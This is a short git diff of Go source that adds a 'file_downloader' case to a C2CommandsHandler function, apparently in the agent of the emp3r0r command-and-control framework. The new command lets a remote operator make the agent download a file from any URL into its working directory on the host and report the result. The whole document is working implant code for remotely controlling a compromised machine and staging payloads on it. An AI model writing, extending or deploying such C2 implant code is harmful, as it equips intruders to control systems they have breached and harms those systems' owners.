@@ -339,6 +339,24 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 			out = fmt.Sprintf("File server on port %s is now %s", *port, *server_switch)
 		}
 
+	case emp3r0r_data.C2CmdFileDownloader:
+		// !file_downloader --url <url> --path <path> --checksum <checksum>
+		url := flags.StringP("download_url", "u", "", "URL to download")
+		path := flags.StringP("path", "p", "", "Path to save")
+		checksum := flags.StringP("checksum", "c", "", "Checksum")
+		flags.Parse(cmdSlice[1:])
+		if *url == "" || *path == "" || *checksum == "" {
+			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
+			return
+		}
+		download_path := fmt.Sprintf("%s/%s", RuntimeConfig.AgentRoot, util.FileBaseName(*path))
+		err = RequestAndDownloadFile(*url, *path, download_path, *checksum)
+		if err != nil {
+			out = fmt.Sprintf("Error: %v", err)
+		} else {
+			out = fmt.Sprintf("File downloaded to %s", *path)
+		}
+
 	default:
 		// let per-platform C2CommandsHandler do the job
 		out = platformC2CommandsHandler(cmdSlice)
